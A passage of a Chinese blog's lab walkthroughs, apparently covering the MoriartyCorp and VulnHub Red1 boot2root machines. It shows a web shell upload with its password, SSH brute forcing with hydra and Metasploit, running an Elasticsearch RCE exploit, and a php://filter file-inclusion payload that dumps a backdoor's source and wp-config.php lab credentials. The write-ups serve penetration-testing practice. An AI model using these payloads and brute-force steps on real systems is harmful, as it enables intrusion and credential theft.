<p><img data-src="./MoriartyCorp/20.png" alt></p>
<ul>
<li>这里上传一个正向马</li>
</ul>
<p><img data-src="./MoriartyCorp/21.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://172.17.0.4/photo/23/2.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> password = ant</span></span><br></pre></td></tr></table></figure>

<p>蚁剑自带的代理设置比较拉，用proxifier即可</p>
<p><img data-src="./MoriartyCorp/22.png" alt></p>
<p><img data-src="./MoriartyCorp/23.png" alt></p>
<p>获得flag{picture_is_worth_1000_words}</p>
<p><img data-src="./MoriartyCorp/24.png" alt></p>
<p>提示：进行密码破解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root</span><br><span class="line">toor</span><br><span class="line">admin</span><br><span class="line">mcorp</span><br><span class="line">moriarty</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> root</span></span><br><span class="line">63a9f0ea7bb98050796b649e85481845  </span><br><span class="line"><span class="meta">#</span><span class="bash"> toor</span></span><br><span class="line">7b24afc8bc80e548d66c4e7ff72171c5</span><br><span class="line"><span class="meta">#</span><span class="bash"> password</span></span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"><span class="meta">#</span><span class="bash"> admin</span></span><br><span class="line">21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"><span class="meta">#</span><span class="bash"> guest</span></span><br><span class="line">084e0343a0486ff05530df6c705c8bb4</span><br><span class="line"></span><br><span class="line">697c6cc76fdbde5baccb7b3400391e30</span><br><span class="line"><span class="meta">#</span><span class="bash"> MCORP</span></span><br><span class="line">8839cfc8a0f24eb155ae3f7f205f5cbc</span><br><span class="line"><span class="meta">#</span><span class="bash"> mcorp</span></span><br><span class="line">35ac704fe1cc7807c914af478f20fd35</span><br><span class="line"><span class="meta">#</span><span class="bash"> weapons </span></span><br><span class="line">b27a803ed346fbbf6d2e2eb88df1c51b</span><br><span class="line"><span class="meta">#</span><span class="bash"> moriarty</span></span><br><span class="line">08552d48aa6d6d9c05dd67f1b4ba8747</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整理后</span></span><br><span class="line">root</span><br><span class="line">toor</span><br><span class="line">password</span><br><span class="line">admin</span><br><span class="line">guest</span><br><span class="line">MCORP</span><br><span class="line">mcorp</span><br><span class="line">weapons</span><br><span class="line">moriarty</span><br></pre></td></tr></table></figure>

<ul>
<li>nmap 扫描22端口</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p22</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/25.png" alt></p>
<p>发现172.17.0.6 开启 22 端口</p>
<ul>
<li>使用hydra(失败)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains hydra -L ./user.txt -P ./pass.txt 172.17.0.6 -t 4 ssh</span><br></pre></td></tr></table></figure>

<ul>
<li>使用msf ssh_login模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 172.17.0.6</span><br><span class="line">set pass_file /root/vulnhub/MoriartyCorp/pass.txt</span><br><span class="line">set user_file /root/vulnhub/MoriartyCorp/user.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>最后账号密码为 root /  weapons</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcf550e29cba:/# cat 3_flag.txt </span><br><span class="line">flag&#123;what_weapons&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/26.png" alt></p>
<p>提示存在一个聊天系统且普通用户账号密码为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username: buyer13</span><br><span class="line">password: arms13</span><br></pre></td></tr></table></figure>

<p>扫描后为 172.17.0.7:8000</p>
<p><img data-src="./MoriartyCorp/27.png" alt></p>
<p>越权修改账号密码</p>
<p><img data-src="./MoriartyCorp/28.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin / 123456</span><br></pre></td></tr></table></figure>

<p>登录admin查看敏感信息</p>
<p><img data-src="./MoriartyCorp/29.png" alt></p>
<p><img data-src="./MoriartyCorp/30.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin: What did you need and what's your budget?</span><br><span class="line">buyer1: I need to arm around 10 people. Budget is 10,000 USD.</span><br><span class="line">admin: Sounds good. Let me see what I can do.</span><br><span class="line">buyer1: I might buy more, is there a discount?</span><br><span class="line">admin: Yes, we can offer a discount. flag&#123;on_the_move&#125;</span><br><span class="line">admin: Buy within a month and we can take 10% off the original price.</span><br><span class="line">buyer1: Sounds like a deal. Let's meet up and discuss the details.</span><br><span class="line">admin: I will send you a message about my shop.</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/31.png" alt></p>
<p>提示存在 es数据库</p>
<ul>
<li>nmap继续扫一波9002端口</li>
</ul>
<p><img data-src="./MoriartyCorp/32.png" alt></p>
<ul>
<li>寻找漏洞利用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit elasticsearch</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                          |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">ElasticSearch - Remote Code Execution                                                                                                                                   | linux/remote/36337.py</span><br><span class="line">ElasticSearch - Remote Code Execution                                                                                                                                   | multiple/webapps/33370.html</span><br><span class="line">ElasticSearch - Search Groovy Sandbox Bypass (Metasploit)                                                                                                               | java/remote/36415.rb</span><br><span class="line">ElasticSearch 1.6.0 - Arbitrary File Download                                                                                                                           | linux/webapps/38383.py</span><br><span class="line">ElasticSearch 7.13.3 - Memory disclosure                                                                                                                                | multiple/webapps/50149.py</span><br><span class="line">ElasticSearch &lt; 1.4.5 / &lt; 1.5.2 - Directory Traversal                                                                                                                   | php/webapps/37054.py</span><br><span class="line">ElasticSearch Dynamic Script - Arbitrary Java Execution (Metasploit)                                                                                                    | java/remote/33588.rb</span><br><span class="line">Elasticsearch ECE 7.13.3 - Anonymous Database Dump                                                                                                                      | multiple/webapps/50152.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxychains python3 /usr/share/exploitdb/exploits/linux/remote/36337.py</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/33.png" alt></p>
<p><img data-src="./MoriartyCorp/34.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>BoredHackerBlog</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>BoredHackerBlog</tag>
      </tags>
  </entry>
  <entry>
    <title>Red1</title>
    <url>/2022/01/16/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Red1/</url>
    <content><![CDATA[<h1 id="Red1"><a href="#Red1" class="headerlink" title="Red1"></a>Red1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Red1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\red1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.145   c0:e7:3e:cb:56:6f       (Unknown)</span><br><span class="line">192.168.1.135   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.147   54:48:e6:5f:39:19       (Unknown)</span><br><span class="line"></span><br><span class="line">13 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.026 seconds (126.36 hosts/sec). 13 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.135</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.135</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\red1&gt; nmap -sV -A -p 1-65535 192.168.1.135</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 13:47 EST</span><br><span class="line">Nmap scan report for red.lan (192.168.1.135)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8d:53:65:83:52:52:c4:12:72:49:be:33:5d:d1:e7:1c (RSA)</span><br><span class="line">|   256 06:61:0a:49:86:43:64:ca:b0:0c:0f:09:17:7b:33:ba (ECDSA)</span><br><span class="line">|_  256 9b:8d:90:47:2a:c1:dc:11:28:7d:57:e0:8a:23:b4:69 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.8.1</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/wp-admin/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Hacked By Red &amp;#8211; Your site has been Hacked! You\xE2\x80\x99ll neve...</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.09 ms red.lan (192.168.1.135)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
<li>设置<code>host</code> </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.135 redrocks.win</span><br></pre></td></tr></table></figure>

<p><img data-src="./Red1/1.png" alt></p>
<p><img data-src="./Red1/2.png" alt></p>
<ul>
<li>红队嘲讽的话语</li>
</ul>
<p><img data-src="./Red1/3.png" alt></p>
<h3 id="扫描后门"><a href="#扫描后门" class="headerlink" title="扫描后门"></a>扫描后门</h3><p><img data-src="./Red1/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.135/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\usr\share\wordlists\seclists\Discovery\Web-Content&gt; gobuster dir -u http://192.168.1.135/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.135/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/01/16 17:39:00 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Progress: 592 / 596 (99.33%)[ERROR] 2022/01/16 17:39:12 [!] Get "http://192.168.1.135/NetworkFileManagerPHP.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><br><span class="line">                            </span><br><span class="line">===============================================================</span><br><span class="line">2022/01/16 17:39:12 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<ul>
<li>发现后门</li>
<li>使用<code>wfuzz</code>扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\usr\share\wordlists\seclists\Discovery\Web-Content&gt; wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx</span><br><span class="line">Total requests: 2588</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                                               </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000004:   500        0 L      0 W        0 Ch        "name"                                                                                                                </span><br><span class="line">000000006:   500        0 L      0 W        0 Ch        "url"                                                                                                                 </span><br><span class="line">000000007:   500        0 L      0 W        0 Ch        "email"                                                                                                               </span><br><span class="line">000000001:   500        0 L      0 W        0 Ch        "id"                                                                                                                  </span><br><span class="line">000000008:   500        0 L      0 W        0 Ch        "type"                                                                                                                </span><br><span class="line">000000005:   500        0 L      0 W        0 Ch        "password"                                                                                                            </span><br><span class="line">000000010:   500        0 L      0 W        0 Ch        "file"                                                                                                                </span><br><span class="line">000000009:   500        0 L      0 W        0 Ch        "username"                                                                                                            </span><br><span class="line">000000002:   500        0 L      0 W        0 Ch        "action"                                                                                                              </span><br><span class="line">000000003:   500        0 L      0 W        0 Ch        "page"                                                                                                                </span><br><span class="line">000000015:   500        0 L      0 W        0 Ch        "user"                                                                                                                </span><br><span class="line">000000011:   500        0 L      0 W        0 Ch        "title"                                                                                                               </span><br><span class="line">000000014:   500        0 L      0 W        0 Ch        "submit"                                                                                                              </span><br><span class="line">000000013:   500        0 L      0 W        0 Ch        "q"                                                                                                                   </span><br><span class="line">000000016:   500        0 L      0 W        0 Ch        "token"                                                                                                               </span><br><span class="line">000000026:   200        1 L      0 W        1 Ch        "key"                                                                   </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>发现文件包含</li>
</ul>
<p><img data-src="./Red1/5.png" alt></p>
<h3 id="尝试rce"><a href="#尝试rce" class="headerlink" title="尝试rce"></a>尝试rce</h3><p>失败</p>
<h3 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.135/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">PD9waHAKICAgJGZpbGUgPSAkX0dFVFsna2V5J107CiAgIGlmKGlzc2V0KCRmaWxlKSkKICAgewogICAgICAgaW5jbHVkZSgiJGZpbGUiKTsKICAgfQogICBlbHNlCiAgIHsKICAgICAgIGluY2x1ZGUoIk5ldHdvcmtGaWxlTWFuYWdlclBIUC5waHAiKTsKICAgfQogICAvKiBWR2hoZENCd1lYTnpkMjl5WkNCaGJHOXVaU0IzYjI0bmRDQm9aV3h3SUhsdmRTRWdTR0Z6YUdOaGRDQnpZWGx6SUhKMWJHVnpJR0Z5WlNCeWRXeGxjdz09ICovCj8+Cgo= </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">   $</span><span class="bash">file = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span></span><br><span class="line"><span class="meta">   if(isset($</span><span class="bash">file))</span></span><br><span class="line">   &#123;</span><br><span class="line">       include("$file");</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">       include("NetworkFileManagerPHP.php");</span><br><span class="line">   &#125;</span><br><span class="line">   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw==</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">That password alone won't help you! Hashcat says rules are rules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.1.135//NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUgaW5zdGFsbGF0aW9uLg0KICogWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbiBjb3B5IHRoaXMgZmlsZSB0byAid3AtY29uZmlnLnBocCINCiAqIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQovLyAqKiBNeVNRTCBzZXR0aW5ncyAtIFlvdSBjYW4gZ2V0IHRoaXMgaW5mbyBmcm9tIHlvdXIgd2ViIGhvc3QgKiogLy8NCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICd3b3JkcHJlc3MnICk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSB1c2VybmFtZSAqLw0KZGVmaW5lKCAnREJfVVNFUicsICdqb2huJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgcGFzc3dvcmQgKi8NCmRlZmluZSggJ0RCX1BBU1NXT1JEJywgJ1Izdl9tNGx3aDNyM19rMW5HISEnICk7DQoNCi8qKiBNeVNRTCBob3N0bmFtZSAqLw0KZGVmaW5lKCAnREJfSE9TVCcsICdsb2NhbGhvc3QnICk7DQoNCi8qKiBEYXRhYmFzZSBDaGFyc2V0IHRvIHVzZSBpbiBjcmVhdGluZyBkYXRhYmFzZSB0YWJsZXMuICovDQpkZWZpbmUoICdEQl9DSEFSU0VUJywgJ3V0ZjgnICk7DQoNCi8qKiBUaGUgRGF0YWJhc2UgQ29sbGF0ZSB0eXBlLiBEb24ndCBjaGFuZ2UgdGhpcyBpZiBpbiBkb3VidC4gKi8NCmRlZmluZSggJ0RCX0NPTExBVEUnLCAnJyApOw0KDQpkZWZpbmUoJ0ZTX01FVEhPRCcsICdkaXJlY3QnKTsNCg0KZGVmaW5lKCdXUF9TSVRFVVJMJywgJ2h0dHA6Ly9yZWRyb2Nrcy53aW4nKTsNCmRlZmluZSgnV1BfSE9NRScsICdodHRwOi8vcmVkcm9ja3Mud2luJyk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gdW5pcXVlIGtleXMgYW5kIHNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcNCiAqIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0uDQogKg0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4NCiAqIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSgnQVVUSF9LRVknLCAgICAgICAgICcydXVCdmM4U081ez5Vd1E8XjVWNVtVSEJ3JU59LUJ3V3F3fD48KkhmQndKKCAkJiUsKFpiZy9qd0ZrUkhmfnZ8Jyk7DQpkZWZpbmUoJ1NFQ1VSRV9BVVRIX0tFWScsICAnYWh9PElgNTJHTDZDXkB+eCBDOUZwTXEtKXR4Z09tQTx+e1I1a3RZL0AuXWRCRj9rZUIzfStZXnUhYTU0IFhjKCcpOw0KZGVmaW5lKCdMT0dHRURfSU5fS0VZJywgICAgJ1thIUt9RDw3LXZCM1kmeF88M2VdV2QrSl0hbytBOlVAUVVaLVJVMV10T0AvTn1ifVJAKy8kK3UqcEp8Wih4dS0nKTsNCmRlZmluZSgnTk9OQ0VfS0VZJywgICAgICAgICcgZzR8QH46aCxLMjlEfSRGTC1mL2V1ancoVlQ7OHdhN3hSV3BWUjogPn0sXSFFei40OEU6b2sgOElwfjVfbythJyk7DQpkZWZpbmUoJ0FVVEhfU0FMVCcsICAgICAgICAnYTssTzx+dmJwTCt8QFcrIVJzMW8sVCRyOShMd2FYSSA9STdaVyQuWlsrQlE9QjZRRzducit3X2JRNkJdNXE0YycpOw0KZGVmaW5lKCdTRUNVUkVfQVVUSF9TQUxUJywgJ0drVTolIExvfSA5fXczOGk6JV09dXEmSjZaJlJSI3YydnNCNWFfICsuW3VzOzZtRSt8JHgqKyBEKktlKzpOdDonKTsNCmRlZmluZSgnTE9HR0VEX0lOX1NBTFQnLCAgICcjYEY5JnBtX2pZfU4zeTAmOFpdRWVMKXosJDM5LHlGYyROcWBqR09NVF9hTSpgPCQ5QTo5PEtrXkx9ZlhAK2laJyk7DQpkZWZpbmUoJ05PTkNFX1NBTFQnLCAgICAgICAnaFRsRkUqNnpsWk1icWx1eiloZjotOngtOmw4OWZDNG90Y2k7Mzh8aWA3ZVUxOytrWyEwW1pHLm9DdDJALXkzWCcpOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBkYXRhYmFzZSB0YWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIEFkZCBhbnkgY3VzdG9tIHZhbHVlcyBiZXR3ZWVuIHRoaXMgbGluZSBhbmQgdGhlICJzdG9wIGVkaXRpbmciIGxpbmUuICovDQoNCg0KDQovKiBUaGF0J3MgYWxsLCBzdG9wIGVkaXRpbmchIEhhcHB5IHB1Ymxpc2hpbmcuICovDQoNCi8qKiBBYnNvbHV0ZSBwYXRoIHRvIHRoZSBXb3JkUHJlc3MgZGlyZWN0b3J5LiAqLw0KaWYgKCAhIGRlZmluZWQoICdBQlNQQVRIJyApICkgew0KCWRlZmluZSggJ0FCU1BBVEgnLCBfX0RJUl9fIC4gJy8nICk7DQp9DQoNCi8qKiBTZXRzIHVwIFdvcmRQcmVzcyB2YXJzIGFuZCBpbmNsdWRlZCBmaWxlcy4gKi8NCnJlcXVpcmVfb25jZSBBQlNQQVRIIC4gJ3dwLXNldHRpbmdzLnBocCc7DQo= </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration for WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the installation.</span><br><span class="line"> * You don't have to use the web site, you can copy this file to "wp-config.php"</span><br><span class="line"> * and fill in the values.</span><br><span class="line"> *</span><br><span class="line"> * This file contains the following configurations:</span><br><span class="line"> *</span><br><span class="line"> * * MySQL settings</span><br><span class="line"> * * Secret keys</span><br><span class="line"> * * Database table prefix</span><br><span class="line"> * * ABSPATH</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/support/article/editing-wp-config-php/</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> */</span><br><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define( 